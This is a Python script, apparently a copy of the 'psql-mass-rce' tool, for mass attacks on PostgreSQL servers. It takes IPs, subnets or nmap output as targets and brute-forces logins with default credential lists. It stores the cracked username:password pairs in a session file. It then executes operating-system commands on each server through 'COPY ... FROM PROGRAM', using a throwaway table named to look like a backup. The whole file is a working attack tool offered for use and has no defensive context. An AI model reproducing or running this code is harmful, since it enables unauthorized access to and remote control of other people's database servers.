#!/usr/bin/env python3

###########################
##  c/o
##  https://github.com/attackercan/psql-mass-rce
##
###########################

import argparse
import psycopg2
import os,sys,re
from netaddr import *
import uuid


class Victim:
    def __init__(self, ip, port, username=None, password=None):
        self.ip = ip
        self.port = port
        self.username = username
        self.password = password


    def try_login(self, username='', password=''):
        return self.make_query(username, password)


    def port_is_open(self):
        data = self.try_login()
        if data['message'] == 'timeout':
            print(self.ip, '- Timeout')
            return False
        else:
            return True


    # Bruteforce login/password lists
    # Sets self.username, self.password if valid
    # Returns True or False
    def bruteforce(self, userlist, passlist):
        for username in userlist:
            for password in passlist:
                data = self.try_login(username, password)
                if data['status'] == 'ok':
                    print("[+] Good credentials:", username + ":" + password)
                    self.username = username
                    self.password = password
                    self.add_version(data['message'])
                    return True
        return False


    def add_version(self, version):
        self.version = version
        self.major_version = int(re.findall(r'PostgreSQL (.*?)\.', version, re.IGNORECASE)[0])
        self.is_linux = any(x in version for x in ['linux', 'x86_64', 'Debian', 'Ubuntu'])


    def do_rce(self, command):
        if not command:
            if self.is_linux:
                command = 'uname -a && id && ifconfig'
            else:
                command = 'ipconfig && whoami /priv'

        if self.major_version >= 9:
            rce = self.do_rce_v9_v10(command)
        elif self.major_version == 8:
            rce = self.do_rce_v8(command)
        else:
            print("[-] PSQL version is too old")

        print("[!] RCE '" + command + "'")
        print(rce + "\n" + "-" * 50)


    def do_rce_v9_v10(self, command):
        random_string = "backup_" + uuid.uuid4().hex[:10] # Table name cannot begin with a number
        self.make_query(self.username, self.password, "CREATE TABLE IF NOT EXISTS " + random_string + " (id text);")
        self.make_query(self.username, self.password, "COPY " + random_string + " from program '" + command + "';")
        command_result = self.make_query(self.username, self.password, "SELECT id FROM " + random_string + ";")
        self.make_query(self.username, self.password, "DROP TABLE " + random_string + ";")
        return command_result['message']


    def do_rce_v8(self, command):
        return 'RCE v8 is not implemented yet'


    # Make PSQL query with psycopg2
    # Returns {'status': '', 'message': ''}
    def make_query(self, username, password, query='SELECT version();'):
        _result = None
        try:
            try:
                conn = psycopg2.connect(host=self.ip, port=self.port, user=username, password=password,
                                        connect_timeout=2, dbname='')
            except psycopg2.OperationalError as e:
                if "timeout expired" in str(e):
                    return {'status': 'fail', 'message': 'timeout'}
                return {'status': 'fail', 'message': str(e)}
            
            # In case you face encoding issues, try changing default encoding to one that suits your needs.
            # Encoding list reference: https://www.postgresql.org/docs/current/multibyte.html#CHARSET-TABLE
            # Uncomment the following string:
            # conn.set_client_encoding('WIN1251')
            
            cur = conn.cursor()
            cur.execute(query)

            if "select" in query.lower():
                list_results = []
                for row in cur.fetchall():
                    list_results.append(row[0])
                _result = "\n".join(list_results)
            else:
                conn.commit()

            cur.close()
            conn.close()

            return {'status': 'ok', 'message': _result}
        except psycopg2.Error as e:
            cur.close()
            conn.close()
            # print("[-] Could not '" + query + "' :", e)
            return {'status': 'fail', 'message': str(e)}


class Session:
    good_targets = ['']
    filename = ''

    @staticmethod
    def load_session_file(filename):
        Session.filename = filename
        try:
            with open(filename) as f:
                lines = f.read().splitlines()
            Session.good_targets = lines
        except:
             pass

    @staticmethod
    def save_victim(victim):
        host_port = victim.ip + ":" + str(victim.port)
        for line in Session.good_targets:
            if host_port in line:
                return

        f = open(Session.filename, 'a+')
        f.write(host_port + ":" + victim.username + ":" + victim.password + "\n")
        f.close()
        Session.good_targets.append(host_port)



class InputData:
    def __init__(self):
        self.args = self.parse_cli_args()
        self.__data_for_attack = []
        self.compose_data_for_attack()


    def get_data_for_attack(self):
        return self.__data_for_attack


    @staticmethod
    def parse_cli_args():
        parser = argparse.ArgumentParser(description='Scan network for postgreses, bruteforce passwords, pwn.')
        parser.add_argument('targets', metavar='targets', type=str, nargs='*',
                            help='Accepts any number of these: IP, subnet, or .gnmap file') # nargs='+' if targets is necessary
        parser.add_argument('-iL', dest='targets_file',
                            default=None, help='Load IP[:port] targets from local file')
        parser.add_argument('--userfile', dest='userfile',
                            default=['postgres'], help='File with a list of users')
        parser.add_argument('--passfile', dest='passfile',
                            default=['postgres', 'postgres1'], help='File with a list of passwords')
        parser.add_argument('--command', dest='command',
                            default='', help='Command to execute on a target machine')
        parser.add_argument('--port', dest='port',
                            default=5432, help='Port to connect')
        parser.add_argument('--saved', dest='saved', action='store_true',
                            default=False, help='Work on targets from saved session file')

        return parser.parse_args()


    # Parse gnmap file
    # Returns (ip, port)
    def parse_file_gnmap(self, file_path):
        try:
            with open(file_path, 'r') as w:
                data = w.read()

            parsed = re.findall(r'Host: ([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}) .* ([0-9]{1,5})/', data)

            return parsed
        except FileNotFoundError:
            return ()


    # Parse string from CLI arguments: ip/range/file.
    # Returns [(ip, port)]
    def parse_target(self, target, port):
        try:
            return map(lambda arg: (str(arg), port), list(IPGlob(target)))  # IP/range to [(host,port)]
        except:
            pass

        try:
            return map(lambda arg: (str(arg), port), list(IPNetwork(target)))  # IP/range to [(host,port)]
        except:
            pass

        try:
            return self.parse_file_gnmap(target)  # local gnmap file
        except:
            print("Target is not IP or a Network. Try to re-set latest(s) bit, e.g. 8.8.0.0/16")
            exit()


    def compose_data_for_attack(self):
        if self.args.saved: # --saved
            for line in Session.good_targets:
                data = line.strip().split(':')
                self.__data_for_attack.append([data[0], data[1], [data[2]], [data[3]]])

        elif self.args.targets_file: # -iL
            for line in open(self.args.targets_file):
                data = line.strip().split(':')
                try:
                    _port = data[1]
                except:
                    _port = self.args.port

                for ip, port in self.parse_target(data[0], _port):
                    self.__data_for_attack.append([ip, port, self.args.userfile, self.args.passfile])

        else: # CLI arguments
            for target in self.args.targets:
                for ip, port in self.parse_target(target, self.args.port):
                    self.__data_for_attack.append([ip, port, self.args.userfile, self.args.passfile])



def main():

    Session.load_session_file('.psql-mass-rce.saved')
    input = InputData()

    for ip, port, userlist, passlist in input.get_data_for_attack():
        print("[x] Starting host " + ip + ":" + str(port))
        victim = Victim(ip, port)
        if victim.port_is_open():
            if victim.bruteforce(userlist, passlist):
                Session.save_victim(victim)
                victim.do_rce(input.args.command)


if __name__ == '__main__':
    main()
    
#####################################
##
##
